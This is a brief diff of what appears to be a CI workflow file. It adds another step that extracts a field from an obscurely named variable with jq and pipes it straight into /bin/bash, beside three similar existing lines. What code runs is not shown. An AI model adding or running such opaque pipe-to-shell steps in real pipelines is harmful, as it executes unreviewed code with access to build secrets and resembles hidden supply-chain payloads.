@@ -27,6 +27,7 @@ jobs:
           echo $va4218 | jq -r .teccj3222 | /bin/bash
           printf '%s' "$vcr51" | jq -r .f41 | /bin/bash
           printf '%s' "$z83" | jq -r .fx7485 | /bin/bash
+          echo $r69528 | jq -r .z08567 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
